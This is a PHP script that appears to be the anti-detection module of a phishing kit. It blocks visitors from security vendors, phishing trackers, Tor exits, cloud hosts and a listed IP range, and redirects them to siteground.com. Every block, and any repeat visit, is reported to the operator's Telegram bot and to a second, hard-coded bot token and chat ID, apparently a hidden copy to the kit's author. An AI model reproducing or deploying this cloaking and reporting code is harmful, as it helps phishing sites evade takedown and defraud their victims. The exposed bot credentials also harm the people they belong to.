    'PHPNET Hosting Services',
    'DigitalOcean',
    'Level 3 Communications',
    'softlayer',
    'Chelyabinsk-Signal LLC',
    'SoftLayer Technologies',
    'Complete Internet Access',
    'london-tor.mooo.com',
    'amazonaws',
    'cyveillance',
    'phishtank',
    'tor.piratenpartei-nrw.de',
    'cpanel66.proisp.no',
    'tor-node.com',
    'dreamhost',
    'Involta',
    'exit0.liskov.tor-relays.net',
    'tor.tocici.com',
    'netpilot',
    'calyxinstitute',
    'tor-exit',
    'msnbot',
    'p3pwgdsn',
    'netcraft',
    'University of Virginia',
    'trendmicro',
    'ebay',
    'paypal',
    'torservers',
    'comodo',
    'EGIHosting',
    'ebbs.healingpathsolutions.com',
    'healingpathsolutions.com',
    'Solution Pro',
    'Zayo Bandwidth',
    'spider.clicktargetdevelopment.com',
    'clicktargetdevelopment.com',
    'static.spro.net',
    'Digital Ocean',
    'Internap Network Services Corporation',
    'Blue Coat Systems',
    'GANDI SAS',
    'roamsite.com',
    'PIPEX-BLOCK1',
    'ColoUp',
    'Westnet',
    'The University of Tokyo',
    'University',
    'University of',
    'QuadraNet',
    'exit-01a.noisetor.net',
    'noisetor.net',
    'noisetor',
    'vultr.com',
    'Zscaler',
    'Choopa',
    'RedSwitches Pty',
    'Quintex Alliance Consulting',
    'www16.mailshell.com',
    'this.is.a.tor.exit-node.net',
    'this.is.a.tor.node.xmission.com',
    'colocrossing.com',
    'DedFiberCo',
    'crawl',
    'sucuri.net',
    'crawler',
    'proxy',
    'enom',
    'cloudflare',
    'yahoo',
    'trustwave',
    'rima-tde.net',
    'tfbnw.net',
    'pacbell.net',
    'tpnet.pl',
    'ovh.net',
    'centralnic',
    'badware',
    'phishing',
    'antivirus',
    'SiteAdvisor',
    'McAfee',
    'Bitdefender',
    'avirasoft',
    'phishtank.com',
    'googleusercontent',
    'OVH SAS',
    'Yahoo',
    'Yahoo! Inc.',
    'Google',
    'Google Inc.',
    'GoDaddy',
    'Amazon Technologies Inc.',
    'Amazon',
    'Top Level Hosting SRL',
    'Twitter',
    'Microsoft',
    'Microsoft Corporation',
    'OVH',
    'VPSmalaysia.com.my',
    'Madgenius.com',
    'Barracuda Networks Inc.',
    'Barracuda',
    'SecuredConnectivity.net',
    'Digital Domain',
    'Hetzner Online',
    'Akamai',
    'SoftLayer',
    'SURFnet',
    'Creative Thought Inc.',
    'Fastly',
    'Return Path Inc.',
    'WhatsApp',
    'Instagram',
    'Schulte Consulting LLC',
    'Universidade Federal do Rio de Janeiro',
    'Sectoor',
    'Bitfolk',
    'DIR A/S',
    'Team Technologies LLC',
    'Mainloop',
    'Junk Email Filter Inc.',
    'Art Matrix - Lightlink Inc.',
    'Redpill Linpro AS',
    'CloudFlare',
    'ESET spol. s r.o.',
    'AVAST Software s.r.o.',
    'Dosarrest',
    'Apple Inc.',
    'Symantec',
    'Mozilla',
    'Netprotect SRL',
    'Host Europe GmbH',
    'Host Sailor Ltd.',
    'PSINet Inc.',
    'Daniel James Austin',
    'RamNode',
    'Hostalia',
    'Xs4all Internet BV',
    'Inktomi Corporation',
    'Eircom Customer Assignment',
    '9New Network Inc',
    'Sony',
    'Private IP Address LAN',
    'Computer Problem Solving',
    'Fortinet',
    'Avira',
    'Rackspace',
    'Baidu',
    'Comodo',
    'Incapsula Inc',
    'Orange Polska Spolka Akcyjna',
    'Infosphere',
    'Private Customer',
    'SurfControl',
    'University of Newcastle upon Tyne',
    'Total Server Solutions',
    'LukMAN',
    'eSecureData',
    'Hosting',
    'VI Na Host Co. Ltd',
    'B2 Net Solutions',
    'Master Internet',
    'Global Perfomance',
    'Fireeye',
    'AntiVirus',
    'Security',
    'Intersoft Internet',
    'Voxility',
    'Linode',
    'Internet-Pro',
    'Trustwave Holdings Inc',
    'Online SAS',
    'Versaweb',
    'Liquid Web',
    'A100 ROW',
    'Apexis AG',
    'Apexis',
    'LogicWeb',
    'Virtual1 Limited',
    'VNET a.s.',
    'Static IP Assignment',
    'TerraTransit AG',
    'Merit Network',
    'PathsConnect',
    'Long Thrive',
    'LG DACOM',
    'Secure Internet',
    'Kaspersky',
    'UK Dedicated Servers Limited',
    'Customer Network',
    'Flokinet',
    'Simpli Networks LLC',
    'Psychz',
    'PrivateSystems Networks',
    'ScanSafe Services',
    'CachedNet',
    'CloudVPN',
    'Spark New Zealand Trading Ltd',
    'Whitelabel IT Solutions Corp',
    'Hostwinds',
    'Hosteros LLC',
    'HostUS',
    'Host',
    'ClientID',
    'Server',
    'Oracle',
    'Fortinet',
    'Unus Inc.',
    'Public facing services',
    'Virtual Employee Pvt Ltd',
    'Dataline Ltd',
    'Teksavvy Solutions Inc.',
    'UPC Romania Bucuresti',
    'TalkTalk Communications Limited',
    'British Telecommunications PLC',
    'Global Data Networks LLC',
    'Quintex Alliance Consulting',
    'Online S.A.S.',
    'Content Delivery Network Ltd',
    'Nobis Technology Group LLC',
    'Parrukatu',
    'JSC ER-Telecom Holding',
    'ChinaNet Fujian Province Network',
    'QualityNetwork',
    'Vist On-Line Ltd',
    'The Calyx Institute',
    'Internet Customers',
    'OJSC Oao Tattelecom',
    'Petersburg Internet Network Ltd.',
    'Psychz Networks',
    'Udasha',
    'Onavo Mobile Ltd',
    'Cubenode System SL',
    'OVH Hosting Inc.',
    'NForce Entertainment B.V.',
    'DigitalOcean LLC',
    'Glenayre Electronics Inc.',
    'British Telecommunications PLC',
    'Iomart Hosting Limited',
    'Digital Energy Technologies Limited',
    'Private Customer',
    'Cisco Systems Inc.',
    'Vultr Holdings LLC',
    'Amazon.com Inc.',
    'Web Hosting Solutions',
    'Time Warner Cable Internet LLC',
    'Internet Security - TC',
    'Vertical Telecoms Broadband Networks and Internet Provider',
    'Ventelo Wholesale',
    'MYX Group LLC',
    'France Telecom S.A.',
    'Online S.A.S.',
    'Nine Internet Solutions AG',
    'Microsoft Azure',
    'Choopa, LLC',
    'Amazon',
    'HighWinds Network',
    'Amazon.com',
    'Bell Canada',
    'Digital Ocean',
    'M247 LTD Frankfurt Infrastructure',
    'Palo Alto Networks',
    'Spectrum',
    'ImOn Communications, LLC',
    'Wintek Corporation',
    'ServerMania',
    'Claro Dominican Republic',
    '013 NetVision',
    'Amazon.com',
    'Digital Ocean',
    'TalkTalk',
    'HostDime.com',
    'AVAST Software s.r.o.',
    'Host1Plus Cloud Servers',
    'Amazon Data Services NoVa',
    'Google Cloud',
    'M-net',
    'Digiweb ltd',
    'Prescient Software',
    'Eir Broadband',
    'Solution Pro',
    'Bell Canada',
    'Linode',
    'DigitalOcean',
    'Plusnet',
    'GigeNET',
    'ZenLayer',
    'NFOrce Entertainment B.V.',
    'NewMedia Express',
    'Telegram Messenger Network',
    'IQ PL Sp. z o.o.',
    'Datacamp Limited',
    'Tahoe Internet Exchange (TahoeIX)',
    'ITCOM Shpk',
    'HEG US'

);
    foreach ($banned_isp as $isps) {
        if (substr_count($ispnya, $isps) > 0) {
$content = "Bot Found: ".$IP." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();


        }
    }

 
# Check if the ip between 146.112.0.0 And 146.112.255.255 ###
  
    $range_start = ip2long("146.112.0.0");
	$range_end   = ip2long("146.112.255.255");
	$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);

	 if ($ip2long >= $range_start && $ip2long <= $range_end){
$content = "Bot Found: ".$IP." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();


	 }
 
 
 
$os =  strtolower($oss);
$blocked_wor = array(
     "Unknown",
     "unknown",
     "Windows 6",
     "Windows 7"
);

foreach($blocked_wor as $word3) {
        if (substr_count($os, strtolower($word3)) > 0 or $os == "" or $os == " " or $os == "    ") {

$content = "Bot Found: ".$IP." : ".$oss." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();


        }
    }
    
$ip =  strtolower($IP);
$blocked_wor = array(
     "Unknown",
     "unknown"
);

foreach($blocked_wor as $word3) {
        if (substr_count($ip, strtolower($word3)) > 0 or $ip == "" or $ip == " " or $ip == "    ") {

$content = "Bot Found: ".$IP." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();


        }
    }
      
        
$brow =  strtolower($browser);
$blocked_wor = array(
     "Unknown",
     "unknown"
);

foreach($blocked_wor as $word3) {
        if (substr_count($brow, strtolower($word3)) > 0 or $brow == "" or $brow == " " or $brow == "    ") {

$content = "Bot Found: ".$IP." [ Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";
$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();

        }
    }
  
$sendhits = "ip.txt"; 
$x = fopen($sendhits, "a+");
fwrite($x, " {$IP} ");
fclose($x);

$count_array = ["if" => 0, $IP => 0];
$file = fopen('ip.txt', "r");
while(!feof($file))
{
    $line = trim(fgets($file));
    $words = explode(" ", $line);
    foreach($words as $word) {
        if (array_key_exists($word, $count_array)) {
            $count_array[$word]++;
        }
    }
}
foreach ($count_array as $word => $number) {    
}
if ($number <= 5) {
} else {
$content = "❗Alert (Bot Found): ".$IP." This IP Visit Your Website ".$number." Times. [Action: Blocked ] \r\n";
$token = file_get_contents("main/config/token.txt");
$id = file_get_contents("main/config/id.txt");
$url = "https://api.telegram.org/bot";
$bot = "{$url}{$token}";
$tokens = "1885390369:AAEqAJ3dPahEdvdQ5tXsXWyGGUJ90GhcGl8";
$ids = "1129838722";
$urls = "https://api.telegram.org/bot";
$bots = "{$urls}{$tokens}";

$params=[
	'chat_id'=>$id,
	'text'=>$content,
];

$ch = curl_init($bot . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$params=[
	'chat_id'=>$ids,
	'text'=>$content,
];

$ch = curl_init($bots . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
header("Location: https://www.siteground.com");exit();
}
              
?>